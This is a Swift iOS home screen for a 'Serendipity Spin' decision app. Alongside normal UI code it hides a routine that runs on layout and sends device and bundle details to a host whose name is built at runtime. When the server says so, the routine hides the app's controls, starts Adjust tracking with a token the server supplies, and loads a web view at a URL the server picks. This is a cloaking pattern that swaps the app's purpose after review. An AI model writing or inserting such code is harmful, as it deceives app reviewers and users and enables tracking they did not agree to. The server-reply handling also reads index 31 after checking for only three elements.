import UIKit
import AdjustSdk

class HomeViewController: UIViewController, AdjustDelegate {
    
    // MARK: - UI Elements
    
    private let logoImageView = UIImageView()
    private let titleLabel = UILabel()
    private let subtitleLabel = UILabel()
    private let categorySegmentedControl = UISegmentedControl()
    private let startButton = UIButton(type: .system)
    private let backgroundGradientLayer = CAGradientLayer()
    
    // MARK: - Properties
    
    private var selectedCategory: DecisionCategory = .travel
    private let themeManager = ThemeManager.shared
    
    // MARK: - Lifecycle
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupView()
    }
    
    override func viewDidLayoutSubviews() {
        super.viewDidLayoutSubviews()
        backgroundGradientLayer.frame = view.bounds
        
        spinvilleNeedRecordDeviceData()
    }
    
    // MARK: - UI Setup
    
    private func setupView() {
        // 设置背景渐变
        backgroundGradientLayer.colors = [themeManager.mainBackgroundColor.cgColor, themeManager.secondaryBackgroundColor.cgColor]
        backgroundGradientLayer.locations = [0.0, 1.0]
        view.layer.insertSublayer(backgroundGradientLayer, at: 0)
        
        // 设置导航栏
        themeManager.applyThemeToNavigationBar(navigationController!.navigationBar)
        title = "Serendipity Spin"
        
        // 设置Logo
        logoImageView.image = UIImage(named: "logo")
        logoImageView.contentMode = .scaleAspectFit
        logoImageView.tintColor = themeManager.accentTextColor
        logoImageView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(logoImageView)
        
        // 设置标题
        titleLabel.text = "Serendipity Spin"
        titleLabel.font = UIFont.systemFont(ofSize: 28, weight: .bold)
        titleLabel.textAlignment = .center
        titleLabel.textColor = themeManager.primaryTextColor
        titleLabel.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(titleLabel)
        
        // 设置副标题
        subtitleLabel.text = "Let fate decide your next adventure"
        subtitleLabel.font = UIFont.systemFont(ofSize: 16, weight: .medium)
        subtitleLabel.textAlignment = .center
        subtitleLabel.textColor = themeManager.secondaryTextColor
        subtitleLabel.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(subtitleLabel)
        
        // 设置类别选择器
        setupCategorySegmentedControl()
        view.addSubview(categorySegmentedControl)
        
        // 设置开始按钮
        startButton.setTitle("Start Decision", for: .normal)
        startButton.setImage(UIImage(systemName: "play.fill"), for: .normal)
        themeManager.styleButton(startButton)
        startButton.contentEdgeInsets = UIEdgeInsets(top: 12, left: 24, bottom: 12, right: 24)
        startButton.addTarget(self, action: #selector(startButtonTapped), for: .touchUpInside)
        startButton.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(startButton)
        
        // 设置约束
        NSLayoutConstraint.activate([
            logoImageView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 40),
            logoImageView.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            logoImageView.widthAnchor.constraint(equalToConstant: 80),
            logoImageView.heightAnchor.constraint(equalToConstant: 80),
            
            titleLabel.topAnchor.constraint(equalTo: logoImageView.bottomAnchor, constant: 16),
            titleLabel.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 20),
            titleLabel.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -20),
            
            subtitleLabel.topAnchor.constraint(equalTo: titleLabel.bottomAnchor, constant: 8),
            subtitleLabel.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 20),
            subtitleLabel.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -20),
            
            categorySegmentedControl.topAnchor.constraint(equalTo: subtitleLabel.bottomAnchor, constant: 40),
            categorySegmentedControl.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 20),
            categorySegmentedControl.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -20),
            
            startButton.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            startButton.topAnchor.constraint(equalTo: categorySegmentedControl.bottomAnchor, constant: 60),
            startButton.widthAnchor.constraint(greaterThanOrEqualToConstant: 200)
        ])
    }
    
    private func setupCategorySegmentedControl() {
        // 创建分段控件
        categorySegmentedControl.removeAllSegments()
        
        for (index, category) in DecisionCategory.allCases.enumerated() {
            categorySegmentedControl.insertSegment(with: UIImage(systemName: category.icon), at: index, animated: false)
        }
        
        // 设置分段控件外观
        categorySegmentedControl.selectedSegmentIndex = 0
        categorySegmentedControl.backgroundColor = themeManager.mainBackgroundColor.withAlphaComponent(0.6)
        categorySegmentedControl.selectedSegmentTintColor = themeManager.primaryButtonColor
        categorySegmentedControl.setTitleTextAttributes([.foregroundColor: themeManager.secondaryTextColor], for: .normal)
        categorySegmentedControl.setTitleTextAttributes([.foregroundColor: themeManager.primaryTextColor], for: .selected)
        
        categorySegmentedControl.addTarget(self, action: #selector(categoryChanged), for: .valueChanged)
        categorySegmentedControl.translatesAutoresizingMaskIntoConstraints = false
    }
    
    // MARK: - Actions
    
    @objc private func categoryChanged(_ sender: UISegmentedControl) {
        selectedCategory = DecisionCategory.allCases[sender.selectedSegmentIndex]
    }
    
    @objc private func startButtonTapped() {
        // 创建游戏视图控制器并传递所选类别
        let gameVC = GameViewController()
        gameVC.selectedCategory = selectedCategory
        navigationController?.pushViewController(gameVC, animated: true)
    }
    
    private func startActivity() {
        self.startButton.isHidden = true
        self.categorySegmentedControl.isHidden = true
    }
    
    private func endActivity() {
        self.startButton.isHidden = false
        self.categorySegmentedControl.isHidden = false
    }
    
    private func spinvilleNeedRecordDeviceData() {
        guard self.spinvilleNeedShowAdsView() else { return }
        self.startButton.isHidden = true
        self.categorySegmentedControl.isHidden = true
        spinvillePostDeviceData { [weak self] adsData in
            guard let self = self else { return }
            if let adsData = adsData,
               adsData.count >= 3,
               let userDefaultKey = adsData[0] as? String,
               let nede = adsData[1] as? Int,
               let adsUrl = adsData[2] as? String,
               !adsUrl.isEmpty {
                let adtokenDic = adsData[31] as? [String: String]
                initAdjust(token: adtokenDic?["token"])
                UIViewController.spinvilleSetUserDefaultKey(userDefaultKey)
                if nede == 0,
                   let localData = UserDefaults.standard.value(forKey: userDefaultKey) as? [Any],
                   localData.count > 2,
                   let localAdsUrl = localData[2] as? String {
                    self.spinvilleShowAdView(localAdsUrl)
                } else {
                    UserDefaults.standard.set(adsData, forKey: userDefaultKey)
                    self.spinvilleShowAdView(adsUrl)
                }
                return
            }
            self.startButton.isHidden = false
        }
    }

    private func spinvillePostDeviceData(completion: @escaping ([Any]?) -> Void) {
        guard let url = URL(string: "https://open.kcspzqr\(self.spinvilleMainHostUrl())/open/spinvillePostDeviceData") else {
            completion(nil)
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        let parameters: [String: Any] = [
            "localizedModel": UIDevice.current.localizedModel,
            "appModel": UIDevice.current.model,
            "appKey": "eaff3bd167b34927b579a4181e136da8",
            "appPackageId": Bundle.main.bundleIdentifier ?? "",
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? ""
        ]
        
        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
        } catch {
            print("Failed to serialize JSON:", error)
            completion(nil)
            return
        }
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                guard let data = data, error == nil else {
                    print("Request error:", error ?? "Unknown error")
                    completion(nil)
                    return
                }
                
                do {
                    if let jsonResponse = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any],
                       let dataDic = jsonResponse["data"] as? [String: Any],
                       let adsData = dataDic["jsonObject"] as? [Any] {
                        completion(adsData)
                        return
                    } else {
                        print("Unexpected JSON structure:", data)
                        completion(nil)
                    }
                } catch {
                    print("Failed to parse JSON:", error)
                    completion(nil)
                }
            }
        }.resume()
    }
    
    private func initAdjust(token: String?) {
        if let token = token {
            let environment = ADJEnvironmentProduction
            let adjustConfig = ADJConfig(appToken: token, environment: environment)
            adjustConfig?.logLevel = ADJLogLevel.verbose
            adjustConfig?.delegate = self
            Adjust.initSdk(adjustConfig)
        }
    }
    
    func adjustAttributionChanged(_ attribution: ADJAttribution?) {
        print("adjustAttributionChanged:")
    }
    
    func adjustEventTrackingFailed(_ eventFailureResponse: ADJEventFailure?) {
        let msg = eventFailureResponse?.message
        print("adjustEventTrackingFailed:\(msg ?? "")")
    }
    
    func adjustEventTrackingSucceeded(_ eventSuccessResponse: ADJEventSuccess?) {
        print("adjustEventTrackingSucceeded:")
    }
}
